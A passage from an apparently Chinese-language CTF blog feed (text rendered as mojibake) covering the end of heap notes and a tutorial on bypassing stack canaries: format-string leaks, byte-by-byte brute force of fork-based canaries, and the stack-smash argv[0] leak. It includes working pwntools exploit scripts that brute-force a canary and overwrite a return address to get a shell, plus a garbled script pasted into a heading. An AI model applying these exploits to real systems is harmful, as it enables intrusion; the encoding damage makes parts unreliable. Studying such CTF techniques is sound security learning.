title="å¤šçº¿ç¨‹æ”¯æŒ"></a>å¤šçº¿ç¨‹æ”¯æŒ</h3><p><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213304.png" alt="Pasted image 20250226213304"><br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213327.png" alt="Pasted image 20250226213327"><br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213356.png" alt="Pasted image 20250226213356"><br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213413.png" alt="Pasted image 20250226213413"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> å † </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNæŠ€å·§-ç»•è¿‡Canaryçš„å‡ ç§å§¿åŠ¿</title>
      <link href="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/"/>
      <url>/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="1-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è·å–Canary"><a href="#1-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è·å–Canary" class="headerlink" title="1. æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è·å–Canary"></a>1. æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è·å–Canary</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pl1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x49</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;overflow?\n&#x27;</span>,pl1)</span><br><span class="line">data=p.recv()</span><br><span class="line">canary=<span class="string">b&#x27;\x00&#x27;</span>+data[<span class="number">0x49</span>:<span class="number">0x49</span>+<span class="number">7</span>]</span><br><span class="line">canary = <span class="built_in">int</span>.from_bytes(canary,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;canary:&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure><h2 id="2-è¦†ç›–æˆªæ–­å­—ç¬¦è·å–Canary"><a href="#2-è¦†ç›–æˆªæ–­å­—ç¬¦è·å–Canary" class="headerlink" title="2. è¦†ç›–æˆªæ–­å­—ç¬¦è·å–Canary"></a>2. è¦†ç›–æˆªæ–­å­—ç¬¦è·å–Canary</h2><h2 id="3-é€å­—èŠ‚çˆ†ç ´Canary"><a href="#3-é€å­—èŠ‚çˆ†ç ´Canary" class="headerlink" title="3. é€å­—èŠ‚çˆ†ç ´Canary"></a>3. é€å­—èŠ‚çˆ†ç ´Canary</h2><blockquote><p>é€‚ç”¨äºæœ‰é€šè¿‡fork()å‡½æ•°åˆ›å»ºçš„å­è¿›ç¨‹çš„ç¨‹åº</p><h3 id="çˆ†ç ´åŸç†"><a href="#çˆ†ç ´åŸç†" class="headerlink" title="çˆ†ç ´åŸç†"></a>çˆ†ç ´åŸç†</h3><ul><li>å¯¹äºCanaryï¼Œè™½ç„¶æ¯æ¬¡è¿›ç¨‹é‡å¯åCanaryä¸åŒï¼Œ<strong>ä½†æ˜¯åŒä¸€ä¸ªè¿›ç¨‹ä¸­çš„ä¸åŒçº¿ç¨‹çš„Cannaryæ˜¯ç›¸åŒçš„ï¼Œå¹¶ä¸”é€šè¿‡forkå‡½æ•°åˆ›å»ºçš„å­è¿›ç¨‹ä¸­çš„canaryä¹Ÿæ˜¯ç›¸åŒçš„ï¼Œå› ä¸ºforkå‡½æ•°ä¼šç›´æ¥æ‹·è´çˆ¶è¿›ç¨‹çš„å†…å­˜</strong>ã€‚</li><li>æœ€ä½ä½ä¸º0x00ï¼Œä¹‹åé€æ¬¡çˆ†ç ´ï¼Œå¦‚æœcanaryçˆ†ç ´ä¸æˆåŠŸï¼Œåˆ™ç¨‹åºå´©æºƒï¼›çˆ†ç ´æˆåŠŸåˆ™ç¨‹åºè¿›è¡Œä¸‹é¢çš„é€»è¾‘ã€‚ç”±æ­¤å¯åˆ¤æ–­çˆ†ç ´æ˜¯å¦æˆåŠŸã€‚</li><li>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™æ ·çš„ç‰¹ç‚¹ï¼Œå½»åº•é€ä¸ªå­—èŠ‚å°†Canaryçˆ†ç ´å‡ºæ¥ã€‚<h3 id="é€šç”¨æ¨¡æ¿"><a href="#é€šç”¨æ¨¡æ¿" class="headerlink" title="é€šç”¨æ¨¡æ¿"></a>é€šç”¨æ¨¡æ¿</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">&#x27;./bin1&#x27;</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">  info(<span class="string">f&#x27;-----No:<span class="subst">&#123;k+<span class="number">1</span>&#125;</span> start,finding-----&#x27;</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">     p.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">0xc</span>)+canary+<span class="built_in">bytes</span>([i]))</span><br><span class="line">     recv = p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>)</span><br><span class="line">     <span class="built_in">print</span>(recv)</span><br><span class="line">     <span class="keyword">if</span> <span class="string">b&quot;stack&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">      canary += <span class="built_in">bytes</span>([i])</span><br><span class="line">      success(<span class="string">f&quot;canary =&gt; <span class="subst">&#123;canary.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><a href="https://xzfile.aliyuncs.com/upload/affix/20190402135117-554ed694-550b-1.zip">https://xzfile.aliyuncs.com/upload/affix/20190402135117-554ed694-550b-1.zip</a></li></ul></blockquote><p>èµ·æ‰‹ä¸€å¥—ç»å…¸è¿æ‹›<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250214201715.png" alt="Pasted image 20250214201715"><br>32ä½ç¨‹åºï¼Œå¼€å¯äº†Canaryå’ŒNXä¿æŠ¤ï¼ŒéšåIDAæŸ¥çœ‹<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250214202433.png" alt="Pasted image 20250214202433"><br>ç¨‹åºä¸­å«æœ‰forkå‡½æ•°ï¼Œæ˜¯å¯è¿›è¡Œçˆ†ç ´canaryçš„é‡ç‚¹<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250214202509.png" alt="Pasted image 20250214202509"><br>funå‡½æ•°readæœ‰æ ˆæº¢å‡ºï¼Œbufç©ºé—´æœ‰100=0x64ï¼Œè€Œæˆ‘ä»¬å¯ä»¥è¾“å…¥0x78çš„å†…å®¹ï¼Œå¾ˆæ˜æ˜¾æ ˆæº¢å‡º<br>è¿™ä¸ªv2å°±æ˜¯Canary<br>æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ä¸€ä½ä¸€ä½çˆ†ç ´Canary</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb bin1</span><br><span class="line">b *<span class="number">0x0804874B</span></span><br><span class="line">b *<span class="number">0x0804870C</span></span><br><span class="line">r</span><br><span class="line"><span class="built_in">set</span> follow-fork-mode child</span><br><span class="line"><span class="comment">//è·Ÿéšå­è¿›ç¨‹</span></span><br><span class="line">c</span><br><span class="line">telescope $esp <span class="number">35</span></span><br><span class="line">canary</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">&#x27;./bin1&#x27;</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">  info(<span class="string">f&#x27;-----No:<span class="subst">&#123;k+<span class="number">1</span>&#125;</span> start,finding-----&#x27;</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">     p.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">0xc</span>)+canary+<span class="built_in">bytes</span>([i]))</span><br><span class="line">     recv = p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>)</span><br><span class="line">     <span class="built_in">print</span>(recv)</span><br><span class="line">     <span class="keyword">if</span> <span class="string">b&quot;stack&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">      canary += <span class="built_in">bytes</span>([i])</span><br><span class="line">      success(<span class="string">f&quot;canary =&gt; <span class="subst">&#123;canary.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x0804863B</span> </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">100</span> + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">12</span> + p32(addr) </span><br><span class="line">p.send(payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>getshell<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250214225926.png" alt="Pasted image 20250214225926"></p><h2 id="4-SSPæ³„éœ²Canary"><a href="#4-SSPæ³„éœ²Canary" class="headerlink" title="4. SSPæ³„éœ²Canary"></a>4. SSPæ³„éœ²Canary</h2><blockquote><p>é€‚ç”¨äºFlagå­˜å‚¨äºå†…å­˜ç©ºé—´ä¸­çš„æƒ…å†µ</p></blockquote><h3 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h3><blockquote><p>OJçš„smashes</p></blockquote><p>Stack smashå°±æ˜¯ç»•è¿‡canaryä¿æŠ¤çš„æŠ€æœ¯ã€‚åœ¨ç¨‹åºåŠ è½½äº†canaryä¿æŠ¤ä¹‹åï¼Œå¦‚æœæˆ‘ä»¬æ˜¯åœ¨è¦†ç›–ç¼“å†²åŒºçš„æ—¶å€™å°±ä¼šè¿å¸¦ç€è¦†ç›–äº†canaryä¿æŠ¤çš„cookieï¼Œ<strong>è¿™ä¸ªæ—¶å€™ç¨‹åºå°±ä¼šæŠ¥é”™ã€‚ä½†æ˜¯è¿™ä¸ªæŠ€æœ¯å¹¶ä¸åœ¨ä¹æ˜¯å¦æŠ¥é”™ï¼Œè€Œæ˜¯åœ¨ä¹æŠ¥é”™çš„å†…å®¹</strong>ã€‚stack smashæŠ€å·§å°±æ˜¯åˆ©ç”¨æ‰“å°è¿™ä¸€ä¿¡æ¯çš„ç¨‹åºæ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ã€‚<br>è¿™æ˜¯å› ä¸ºåœ¨ç¨‹åºå¯åŠ¨canaryä¿æŠ¤ä¹‹åï¼Œå¦‚æœå‘ç°canaryè¢«ä¿®æ”¹çš„è¯å°±ä¼šæ‰§<strong>stack_chk_failå‡½æ•°æ¥æ‰“å°argv[0]æŒ‡é’ˆæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œæ­£å¸¸æƒ…å†µä¸‹è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘ç¨‹åºåã€‚ä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) __stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) internal_function __fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æ‰€ä»¥å¦‚æœæˆ‘ä»¬åˆ©ç”¨æ ˆæº¢å‡ºè¦†ç›–argv[0]ä¸ºæˆ‘ä»¬æƒ³è¦è¾“å‡ºçš„å­—ç¬¦ä¸²åœ°å€ï¼Œé‚£ä¹ˆåœ¨</strong>fortify_failå‡½æ•°ä¸­å°±ä¼šè¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯<br><strong>sspæ”»å‡»ï¼šargv[0]æ˜¯æŒ‡å‘ç¬¬ä¸€ä¸ªå¯åŠ¨å‚æ•°å­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼Œåªè¦æˆ‘ä»¬èƒ½å¤Ÿè¾“å…¥è¶³å¤Ÿé•¿çš„å­—ç¬¦ä¸²è¦†ç›–æ‰argv[0]ï¼Œæˆ‘ä»¬å°±èƒ½è®©canaryä¿æŠ¤è¾“å‡ºæˆ‘ä»¬æƒ³è¦åœ°å€ä¸Šçš„å€¼</strong></p><h3 id="xxxxxxxxxx21-1from-pwn-import-2-context-log-level-â€œdebugâ€3context-terminal-â€œdeepin-terminalâ€-â€œ-xâ€-â€œshâ€-â€œ-câ€-4â€‹5while-True-6-try-7-io-process-â€œ-babypieâ€-timeout-1-8-9-gdb-attach-io-10-io-sendafter-bâ€-nâ€-bâ€™aâ€™-0x30-0x8-1-11-io-recvuntil-bâ€™aâ€™-0x30-0x8-1-12-canary-bâ€™-0â€™-io-recvn-7-13-success-canary-encode-â€˜hexâ€™-14-15-gdb-attach-io-16-io-sendafter-bâ€-nâ€-bâ€™aâ€™-0x30-0x8-canary-bâ€™bbbbbbbbâ€™-bâ€™-x3E-x0Aâ€™-17-18-io-interactive-19-except-Exception-as-e-20-io-close-21-print-ï¼ˆeï¼‰python"><a href="#xxxxxxxxxx21-1from-pwn-import-2-context-log-level-â€œdebugâ€3context-terminal-â€œdeepin-terminalâ€-â€œ-xâ€-â€œshâ€-â€œ-câ€-4â€‹5while-True-6-try-7-io-process-â€œ-babypieâ€-timeout-1-8-9-gdb-attach-io-10-io-sendafter-bâ€-nâ€-bâ€™aâ€™-0x30-0x8-1-11-io-recvuntil-bâ€™aâ€™-0x30-0x8-1-12-canary-bâ€™-0â€™-io-recvn-7-13-success-canary-encode-â€˜hexâ€™-14-15-gdb-attach-io-16-io-sendafter-bâ€-nâ€-bâ€™aâ€™-0x30-0x8-canary-bâ€™bbbbbbbbâ€™-bâ€™-x3E-x0Aâ€™-17-18-io-interactive-19-except-Exception-as-e-20-io-close-21-print-ï¼ˆeï¼‰python" class="headerlink" title="xxxxxxxxxx21 1from pwn import 2#  context.log_level = â€œdebugâ€3context.terminal = [â€œdeepin-terminalâ€, â€œ-xâ€, â€œshâ€, â€œ-câ€]4â€‹5while True:6    try:7        io = process(â€œ./babypieâ€, timeout = 1)8        9        #  gdb.attach(io)10        io.sendafter(bâ€:\nâ€, bâ€™aâ€™  (0x30 - 0x8 + 1))11        io.recvuntil(bâ€™aâ€™  (0x30 - 0x8 + 1))12        canary = bâ€™\0â€™ + io.recvn(7)13        success(canary.encode(â€˜hexâ€™))14        15        #  gdb.attach(io)16        io.sendafter(bâ€:\nâ€, bâ€™aâ€™  (0x30 - 0x8) + canary + bâ€™bbbbbbbbâ€™ + bâ€™\x3E\x0Aâ€™)17        18        io.interactive()19    except Exception as e:20        io.close()21        print ï¼ˆeï¼‰python"></a>xxxxxxxxxx21 1from pwn import <em>2#  context.log_level = â€œdebugâ€3context.terminal = [â€œdeepin-terminalâ€, â€œ-xâ€, â€œshâ€, â€œ-câ€]4â€‹5while True:6    try:7        io = process(â€œ./babypieâ€, timeout = 1)8        9        #  gdb.attach(io)10        io.sendafter(bâ€:\nâ€, bâ€™aâ€™ </em> (0x30 - 0x8 + 1))11        io.recvuntil(bâ€™aâ€™ <em> (0x30 - 0x8 + 1))12        canary = bâ€™\0â€™ + io.recvn(7)13        success(canary.encode(â€˜hexâ€™))14        15        #  gdb.attach(io)16        io.sendafter(bâ€:\nâ€, bâ€™aâ€™ </em> (0x30 - 0x8) + canary + bâ€™bbbbbbbbâ€™ + bâ€™\x3E\x0Aâ€™)17        18        io.interactive()19    except Exception as e:20        io.close()21        print ï¼ˆeï¼‰python</h3><p>è€è¿æ‹›<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215192414.png" alt="Pasted image 20250215192414"><br>å¼€äº†Canaryå’ŒNX<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215193505.png" alt="Pasted image 20250215193505"><br>ç¨‹åºæä¾›ä¸¤æ¬¡è¾“å…¥<code>!_IO_gets(v3)</code>å’Œ<code>**_IO_getc(stdin)**</code>ä¸¤æ¬¡è¾“å…¥éƒ½å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´<br>é¡ºå¸¦æä¸€ä¸‹ç¬¬äºŒæ¬¡çš„è¾“å…¥ï¼šå°†å†…å®¹è¾“å…¥åˆ°stdioä¸­ï¼Œé€šè¿‡å¾ªç¯æœ€åèµ‹å€¼ç»™äº†byte_600D20,å¯ä»¥çœ‹åˆ°æ•°ç»„é‡Œé¢å­˜æ”¾çš„æ˜¯ä¸€æ¡flagï¼Œæ­¤å¤–ç¨‹åºä¸­è¿˜æåˆ°äº†overwrite flagï¼Œæ‰€ä»¥è¿™é“é¢˜å¹¶ä¸æ˜¯æ‹¿shellï¼Œè€Œæ˜¯ä¸€é“æ‹¿flagçš„é¢˜ã€‚å›åˆ°å‰é¢çš„ç¨‹åºï¼Œv1å˜é‡æ¥æ”¶ç¬¬äºŒæ¬¡è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ä¼šä¸æ–­è¦†ç›–åŸæœ‰çš„flagå†…å®¹<br>å†çœ‹ä»¥ä¸‹memsetå‡½æ•°ï¼š<br><code>memset((void *)((int)v0 + 6294816LL), 0, (unsigned int)(32 - v0));</code><br>è¿™ä¸ªå‡½æ•°çš„æ„æ€æ˜¯ä»v1 + 0x600D20LLè¿™ä¸ªåœ°å€å¾€å32 - v1å­—èŠ‚çš„å†…å®¹éƒ½ä»¥0æ›¿ä»£ã€‚<br>å‡½æ•°åŸå‹`void <em> memset( void </em> ptr, int value, size_t num );<br>å¯ä»¥çœ‹åˆ°0x600D20å¤„æ­£æ˜¯æˆ‘ä»¬flagæ‰€åœ¨çš„ä½ç½®ï¼Œæ‰€ä»¥æ— è®ºè¿›ä¸è¿›è¡Œç¬¬äºŒæ¬¡è¾“å…¥ï¼Œç¨‹åºéƒ½ä¼šæŠŠåŸæœ‰çš„flagè¦†ç›–æ‰ã€‚è¿™å°±å¾ˆéº»çƒ¦äº†ï¼Œæˆ‘ä»¬æƒ³è¦çš„å°±æ˜¯åˆ©ç”¨canaryæ‰“å°æŠ¥é”™çš„åŸç†ï¼Œå°†argv[0]æŒ‡å‘è¿™ä¸ªflagçš„åœ°å€ï¼Œä½†æ˜¯flagæ— è®ºæ€ä¹ˆæ ·éƒ½ä¼šè¢«è¦†ç›–</p><p>è¿™ä¸ªæ—¶å€™å°±éœ€è¦åˆ©ç”¨ä¸€ä¸ªæŠ€å·§ï¼š<strong><em>åœ¨ ELF å†…å­˜æ˜ å°„æ—¶ï¼Œbss æ®µä¼šè¢«æ˜ å°„ä¸¤æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦ä¸€å¤„çš„åœ°å€æ¥è¿›è¡Œè¾“å‡º</em></strong></p><blockquote><p><strong>å½“å¯æ‰§è¡Œæ–‡ä»¶è¶³å¤Ÿå°æ—¶ï¼Œå®ƒçš„ä¸åŒåŒºæ®µå¯èƒ½ä¼šè¢«å¤šæ¬¡æ˜ å°„</strong></p><h4 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h4><p>æˆ‘ä»¬å¯ä»¥å°†ç¨‹åºç”¨gdbæ‰“å¼€ï¼Œè¿è¡Œèµ·æ¥çœ‹ä¸€ä¸‹ç¨‹åºæ˜ å°„çš„æƒ…å†µï¼š<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215193505-1742920939134-10.png" alt="Pasted image 20250215193505"></p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x400000</span>           <span class="number">0x401000</span> r-xp     <span class="number">1000</span>      <span class="number">0</span> /home/zechariah/æ¡Œé¢/pwn_learn/start/smashes</span><br><span class="line"><span class="number">0x600000</span>           <span class="number">0x601000</span> rw-p     <span class="number">1000</span>      <span class="number">0</span> /home/zechariah/æ¡Œé¢/pwn_learn/start/smashes</span><br></pre></td></tr></table></figure><p>åœ¨è°ƒè¯•çš„æ—¶å€™å¯ä»¥çœ‹åˆ°smashesè¢«æ˜ å°„åˆ°ä¸¤å¤„åœ°å€ä¸­ï¼Œæ‰€ä»¥åªè¦åœ¨äºŒè¿›åˆ¶æ–‡ä»¶<code>(offset)0x0000 ~ 0x1000</code>èŒƒå›´å†…çš„å†…å®¹éƒ½ä¼šè¢«æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œåˆ†åˆ«ä»¥<code>0x400000</code>å’Œ<code>0x600000</code>ä½œä¸ºèµ·å§‹åœ°å€ã€‚flagåœ¨<code>0x00000d20</code>ï¼Œæ‰€ä»¥ä¼šåœ¨å†…å­˜ä¸­å‡ºç°ä¸¤æ¬¡ï¼Œåˆ†åˆ«ä½äº<code>0x00600d20</code>å’Œ<code>0x00400d20</code>ã€‚æ‰€ä»¥è™½ç„¶<code>0x00600d20</code>çš„ä½ç½®è™½ç„¶è¢«è¦†ç›–äº†ï¼Œä½†æ˜¯ä¾ç„¶å¯ä»¥åœ¨<code>0x00400d20</code>çš„ä½ç½®æ‰¾åˆ°flag<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215213101.png" alt="Pasted image 20250215213101"></p><h4 id="æ‰¾argv-0-æŒ‡é’ˆä½ç½®"><a href="#æ‰¾argv-0-æŒ‡é’ˆä½ç½®" class="headerlink" title="æ‰¾argv[0]æŒ‡é’ˆä½ç½®"></a>æ‰¾argv[0]æŒ‡é’ˆä½ç½®</h4><p>çŸ¥é“äº†flagå­˜æ”¾çš„ä½ç½®ï¼Œæ¥ä¸‹æ¥éœ€è¦æ‰¾argv[0]æ‰€åœ¨çš„ä½ç½®äº†ï¼Œargv[0]æœ‰ä¸€ä¸ªæ˜æ˜¾çš„ç‰¹å¾ï¼Œå°±æ˜¯ä»–ä¼šæŒ‡å‘ç¨‹åºåï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨gdbåœ¨mainå‡½æ•°å¤„ä¸‹æ–­ç‚¹ï¼Œæ¥ä¸‹æ¥æ‰¾æŒ‡å‘ç¨‹åºåçš„æŒ‡é’ˆå°±ä¼šæ˜¯argv[0]äº†<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215213646.png" alt="Pasted image 20250215213646"><br>0x7fffffffdf2få­˜æ”¾ç¨‹åºåç§°ï¼Œè¿™ä¸ªåœ°å€è¢«æ”¾åœ¨0x7fffffffdbf8å¤„ï¼Œåªè¦æŠŠ0x7fffffffdbf8ä¸­çš„å†…å®¹æ›¿æ¢æˆflagå³å¯<br>ä¹Ÿå¯ä»¥ç”¨å‘½ä»¤<code>p &amp; __libc_argv[0]</code> å¾—åˆ°argv[0]çš„åœ°å€<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215213950.png" alt="Pasted image 20250215213950"></p><h4 id="å¯»æ‰¾è¾“å…¥æ—¶çš„æ ˆé¡¶ä½ç½®"><a href="#å¯»æ‰¾è¾“å…¥æ—¶çš„æ ˆé¡¶ä½ç½®" class="headerlink" title="å¯»æ‰¾è¾“å…¥æ—¶çš„æ ˆé¡¶ä½ç½®"></a>å¯»æ‰¾è¾“å…¥æ—¶çš„æ 